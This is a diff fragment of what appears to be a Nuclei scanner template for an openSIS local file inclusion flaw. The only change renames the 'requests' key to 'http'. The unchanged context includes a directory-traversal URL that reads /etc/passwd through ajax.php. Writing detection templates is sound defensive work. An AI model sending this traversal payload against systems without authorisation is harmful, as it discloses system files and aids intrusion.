@@ -9,7 +9,7 @@ info:
     - https://www.exploit-db.com/exploits/38039
   tags: opensis,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php"
